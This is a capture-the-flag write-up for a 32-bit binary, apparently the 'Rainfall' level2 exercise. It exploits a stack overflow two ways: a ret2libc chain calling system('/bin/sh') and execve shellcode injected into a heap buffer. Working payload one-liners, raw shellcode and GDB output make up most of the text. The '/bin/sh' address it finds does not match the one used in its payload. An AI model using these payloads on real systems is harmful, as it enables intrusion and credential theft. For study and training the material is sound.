# Level 2

We found two methods here :

## Methode 1: ret2Libc

First, we have to check if there is an overflow and where.

```sh
$ python ../tools/pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Let's start GDB and launch our program with this pattern

```sh
$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level2/level2 <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

The program crash with 0x37634136 in final value, it's out point of entry. Now we can find the size of the buffer crashing the program.

```sh
$ python pattern.py --crash 37634136
Buffer crashed at size: 80
```

We have our offset, let's try to do a ret2libc exploit. It consists in adding a function call of libc at the end of the EIP register.
We are going to call system() with /bin/sh as argument let’s find those addresses with GDB.
We also need exit() to leave properly and the return address of the main.

```sh
$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) disass
Dump of assembler code for function main:
   0x0804853f <+0>:		push   %ebp
   0x08048540 <+1>:		mov    %esp,%ebp
=> 0x08048542 <+3>:		and    $0xfffffff0,%esp
   0x08048545 <+6>:		call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

We also have to find a string containing "/bin/sh", for this we will be helped by the environment:

```sh
$ export HACK=/bin/sh
$ /tmp/genv HACK ./level2
HACK will be at 0xbffff91d
```

A little resume of the situation:

```
offset:           80
ret address:      0x0804854b
system address:   0xb7e6b060
exit address:     0xb7e5ebe0
/bin/sh address:  0xbffff91d
```

Now, it's time for the exploit :D<br>
`[ OFFSET ] [ RETURN ADDRESS ] [ SYSTEM ADDRESS ] [ EXIT ADDRESS ] [ ARGS ADDRESS ]`

```sh
$ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK`�����X���
whoami
level3
cat /home/user/level3/.pass
```

Sources:<br>
[0xRick's Blog](https://0xrick.github.io/binary-exploitation/bof6/)<br>
[hackndo](https://beta.hackndo.com/retour-a-la-libc/)<br>
[CTF101](https://ctf101.org/binary-exploitation/buffer-overflow/)<br>
[0x0ff.info](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-2/)<br>

## method 2: exec a shellcode stored in the malloced buffer

### shellcode executing system(/bin//sh):

\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

```sh
$ ndisasm -b32 shellcode
00000000  31C0              xor eax,eax
00000002  99                cdq                       # set edx at 0
00000003  50                push eax
00000004  682F2F7368        push dword 0x68732f2f
00000009  682F62696E        push dword 0x6e69622f
0000000E  89E3              mov ebx,esp
00000010  50                push eax
00000011  53                push ebx
00000012  89E1              mov ecx,esp
00000014  B00B              mov al,0xb
00000016  CD80              int 0x80
```

### offset is 80:

```sh
gdb ./level2
(gdb) r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

0x37634136 => 80
(https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

### in rainfall we get the address of the malloced string:

```sh
$ ltrace ./level2 <<< coucou
strdup("coucou")  = 0x0804a008
```

### the hack:

```sh
$ (python -c 'print("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x41" * 56 + "\x08\xa0\x04\x08")';cat) | ./level2
```
